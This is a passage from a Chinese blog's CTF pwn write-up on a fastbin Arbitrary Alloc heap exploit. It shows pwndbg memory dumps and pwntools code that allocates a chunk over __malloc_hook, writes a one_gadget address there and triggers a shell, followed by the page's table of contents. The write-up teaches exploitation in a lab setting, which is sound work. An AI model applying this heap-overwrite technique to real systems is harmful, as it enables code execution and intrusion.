class="hljs-number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="hljs-number">45</span>&gt;:	<span class="hljs-number">0x5555757080000000</span>	<span class="hljs-number">0x0000000000000055</span><br><span class="hljs-number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="hljs-number">61</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<h4 id="2-4-控制-malloc-hook"><a href="#2-4-控制-malloc-hook" class="headerlink" title="2-4-控制-malloc-hook"></a>2-4 控制__malloc_hook</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index7</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000060</span><br>                <span class="hljs-comment">#index4（此处发生了改变）#（此处发生了改变）     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#（此处发生了改变）     #index6（原index5）</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br><span class="hljs-number">0x5fcead987c0</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000060</span><br>    			<span class="hljs-comment">#index7</span><br><span class="hljs-number">0x5fcead987d0</span>:	<span class="hljs-number">0x00007ffff7dd1afd</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<h4 id="2-5-写入-one-gadget-并-getshell"><a href="#2-5-写入-one-gadget-并-getshell" class="headerlink" title="2-5-写入-one-gadget-并-getshell"></a>2-5 写入 one_gadget 并 getshell</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br>gdb.attach(p)<br></code></pre></td></tr></tbody></table></figure>
<h4 id="2-6-最后申请一个chunk"><a href="#2-6-最后申请一个chunk" class="headerlink" title="2-6-最后申请一个chunk"></a>2-6 最后申请一个chunk</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>最后就能get shell 了</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/14/unsorted%20bin%20attack/">← Next unsorted bin</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/12/House%20of%20Force/">House of Force Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">fastbin_attack中的Arbitrary Alloc（例题）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">main 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-addr-%E5%87%BD%E6%95%B0-%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.2.</span> <span class="toc-text">get_addr 函数(生成随机地址)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meau-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">meau 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alloc-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">Alloc 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fill-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">Fill 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Free-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.6.</span> <span class="toc-text">Free 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dump-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">Dump 函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">gdb 动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%ADASLR%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">关闭ASLR保护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.4.</span> <span class="toc-text">exp 讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-leak-libc-addr"><span class="toc-number">1.4.2.</span> <span class="toc-text">1. leak libc_addr</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E6%A8%A1%E4%BB%BF%E7%A8%8B%E5%BA%8F%E5%8A%9F%E8%83%BD"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1-1 模仿程序功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E7%94%B3%E8%AF%B7-5%E4%B8%AAchunk"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">1-2 申请 5个chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-free%E5%88%9B%E5%BB%BA%E7%9A%84index1%E5%92%8Cindex2"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">1-3 free创建的index1和index2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E5%AF%B9-index0-%E8%BF%9B%E8%A1%8C-fill-%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%BA%A2%E5%87%BA%E4%BF%AE%E6%94%B9-index2-%E5%92%8C-fd-%E6%8C%87%E9%92%88"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-%E5%AF%B9-index3-%E8%BF%9B%E8%A1%8Cfill%E6%93%8D%E4%BD%9C%EF%BC%8C%E5%B0%86-index4-%E7%9A%84%E5%A4%A7%E5%B0%8F%E4%BF%AE%E6%94%B9%E4%B8%BA-0x21"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">1-5 对 index3 进行fill操作，将 index4 的大小修改为 0x21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-%E7%94%B3%E8%AF%B7-index4"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">1-6 申请 index4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-7-%E4%BF%AE%E6%94%B9-index4-%E7%9A%84-size-%E4%B8%BA0x91"><span class="toc-number">1.4.2.7.</span> <span class="toc-text">1-7 修改 index4 的 size 为0x91</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-8-%E7%94%B3%E8%AF%B7%E6%96%B0%E5%A0%86%E5%9D%97-index-5"><span class="toc-number">1.4.2.8.</span> <span class="toc-text">1-8 申请新堆块 index 5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-9-free-index4-%EF%BC%8Cindex4-%E6%94%BE%E5%85%A5-unsorted-bin-%E4%B8%AD"><span class="toc-number">1.4.2.9.</span> <span class="toc-text">1-9 free(index4)，index4 放入 unsorted bin 中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-10-%E8%AE%A1%E7%AE%97libc%E5%9F%BA%E5%9D%80"><span class="toc-number">1.4.2.10.</span> <span class="toc-text">1-10 计算libc基址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8E%A7%E5%88%B6-malloc-hook"><span class="toc-number">1.4.3.</span> <span class="toc-text">2. 控制_malloc_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E7%94%B3%E8%AF%B7-unsorted-bin-%E4%B8%AD%E7%9A%84-chunk"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">2-1 申请 unsorted bin 中的 chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-free-index4"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">2-2 free(index4)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E4%BF%AE%E6%94%B9index4%E7%9A%84fd%E6%8C%87%E9%92%88"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">2-3 修改index4的fd指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E6%8E%A7%E5%88%B6-malloc-hook"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">2-4 控制__malloc_hook</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-%E5%86%99%E5%85%A5-one-gadget-%E5%B9%B6-getshell"><span class="toc-number">1.4.3.5.</span> <span class="toc-text">2-5 写入 one_gadget 并 getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6-%E6%9C%80%E5%90%8E%E7%94%B3%E8%AF%B7%E4%B8%80%E4%B8%AAchunk"><span class="toc-number">1.4.3.6.</span> <span class="toc-text">2-6 最后申请一个chunk</span></a></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>